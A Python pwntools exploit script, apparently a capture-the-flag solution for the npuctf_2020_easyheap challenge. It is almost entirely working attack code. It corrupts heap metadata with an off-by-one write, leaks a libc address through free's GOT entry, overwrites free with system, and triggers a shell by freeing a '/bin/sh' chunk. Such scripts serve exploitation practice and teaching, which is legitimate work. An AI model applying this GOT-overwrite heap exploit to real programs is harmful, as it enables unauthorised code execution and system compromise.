#2020/12/13
from pwn import *

context.log_level = 'debug'
elf = ELF('./npuctf_2020_easyheap')
libc = ELF('./libc-2.27.so')
io = process('./npuctf_2020_easyheap')

def debug():
    gdb.attach(io)
    pause()

def add(size,content):
    io.sendlineafter('Your choice :',str(1))
    io.sendlineafter('Size of Heap(0x10 or 0x20 only) : ',str(size))
    io.sendlineafter('Content:',content)
 
def delete(idx):
    io.sendlineafter('Your choice :',str(4))
    io.sendlineafter('Index :',str(idx))
 
def show(idx):
    io.sendlineafter('Your choice :',str(3))
    io.sendlineafter('Index :',str(idx))
    
def edit(idx,content):
    io.sendlineafter('Your choice :',str(2))
    io.sendlineafter('Index :',str(idx))
    io.recvuntil("Content: ")
    io.send(content)
 
add(0x18, 'aa') # idx 0
add(0x18, 'an') # idx 1
edit(0, '/bin/sh\x00' + p64(0)*2 + '\x41')
delete(1)
#debug()
add(0x38,'a'*0x20+p64(0x38)+p64(elf.got['free']))
show(1)
io.recvuntil('Content : ')
atoi_addr = u64(io.recvuntil('\x7f').ljust(8, '\x00'))
libc.address = atoi_addr - libc.symbols['free']
system = libc.symbols['system']

success('system -> ' + hex(system))
edit(1, p64(system))
#debug()
show(1)
delete(0)
io.interactive()

